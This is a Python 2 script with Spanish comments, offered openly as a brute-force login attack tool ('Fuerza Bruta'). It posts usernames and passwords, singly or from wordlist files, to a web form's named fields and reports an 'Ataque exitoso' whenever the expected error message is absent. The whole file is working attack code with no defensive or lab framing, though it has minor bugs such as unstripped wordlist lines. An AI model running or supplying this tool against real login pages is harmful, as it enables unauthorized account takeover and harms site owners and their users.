#!/usr/bin/python

import requests
import argparse
import sys
from lxml.html import fromstring
import os.path

arg = ''
url = ''
userField = ''
passField = ''
user = ''
pwd = ''
userFile = ''
pwdFile = ''
message = ''
	

#def bruteforce(url, userField, passField, user, pwd, userFile, pwdFile, message):
	
	
def single(url, userField, passField, user, pwd, userFile, pwdFile, message):
	#Antes del ataque
	mbefore = message
	#Login
	payload = { userField : user, passField: pwd}
	r = requests.post(url, data= payload)
		
	mafter =  r.text
	if mbefore in mafter:
		print 'Ataque no exitoso con:'  + " User: " + user + " Password: " + pwd
	else:
		print "Ataque exitoso con:" + "User: " + user  + " Password: " + pwd
	

def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
	users = []
	if os.path.exists(userFile): #archivo con usuarios
		fo = open(userFile, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		for i in range(0,len(users)):
			#Antes del ataque
			mbefore = message
		
			#Login
			payload = { userField : users[i], passField: pwd}
			r = requests.post(url, data= payload)
	
			#Login exitoso
			mafter =  r.text
			if mbefore in mafter:
				print 'Ataque no exitoso con:'  + " User: " + users[i] + " Password: " + pwd
			else:
				print "Ataque exitoso con:" + " User: " + users[i]  + " Password: " + pwd

def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
	passwords = []
	if os.path.exists(pwdFile): #archivo con usuarios
		fo = open(pwdFile, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(passwords)):
			#Antes del ataque
			mbefore = message
		
			#Login
			payload = { userField : user, passField: passwords[i]}
			r = requests.post(url, data= payload)
	
			#Login exitoso
			mafter =  r.text
			if mbefore in mafter:
				print 'Ataque no exitoso con:'  + " User: " + user + " Password: " + passwords[i]
			else:
				print "Ataque exitoso con:" + " User: " + user  + " Password: " + passwords[i]


def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
	users = []
	passwords = []
	i = 0
	j = 0
	
	if os.path.exists(userFile) and os.path.exists(pwdFile): # ambos archivos
		
		fo = open(userFile, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		fo = open(pwdFile, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(users)):
			for j in range (0,len(passwords)):
				#Antes del ataque
				mbefore = message
				
				#Login
				payload = { userField : users[i], passField: passwords[j]}
				
				r = requests.post(url, data= payload)
	
				#Login exitoso
				mafter =  r.text
				if mbefore in mafter:
					print 'Ataque no exitoso con:'  + " User: " + users[i] , " Password: " + passwords[j]
				else:
					print "Ataque exitoso con:" + " User: " + users[i]  , " Password: " + passwords[j]
					
				j + 1
			i + 1
		


def getParams(arg):
	parser = argparse.ArgumentParser(description='Fuerza Bruta',
		formatter_class=argparse.ArgumentDefaultsHelpFormatter)

	parser.add_argument('-b', '--bruteforce', help = 'URL Site', required=True)
	parser.add_argument('-f','--userField', help = 'User Field to attack', required=True)
	parser.add_argument('-F', '--passField', help = 'Password Field to attack', required=True)
	parser.add_argument('-u', '--user', help = 'User account')
	parser.add_argument('-p', '--password', help='User\'s password')
	parser.add_argument('-U', '--users', help='File with users')
	parser.add_argument('-P', '--passwords', help='File with passwords')
	parser.add_argument('-m', '--message', help='Error message', required=True)
	
	
					
	options = parser.parse_args()
	
	
	if len(sys.argv) == 1:
		print parser.print_help()
	
	if options.user is None and options.password is None and options.users is not None and options.passwords is not None:
		doubleFile(options.bruteforce,options.userField,options.passField,'','',options.users,options.passwords,options.message)
	elif options.password is None and options.users is None and options.user is not None and options.passwords is not None:
		pwdFile(options.bruteforce,options.userField,options.passField,options.user,'','',options.passwords,options.message)
	elif options.user is None and options.passwords is None and options.users is not None and options.password is not None:
		usersFile(options.bruteforce,options.userField,options.passField,'',options.password,options.users,'',options.message)
	elif options.users is None and options.passwords is None and options.user is not None and options.password is not None:
		single(options.bruteforce,options.userField,options.passField,options.user,options.password,'','',options.message)
	elif options.user is None and options.users is None or options.password is None and options.passwords is None:
		print parser.print_help()
		

		
getParams(arg)

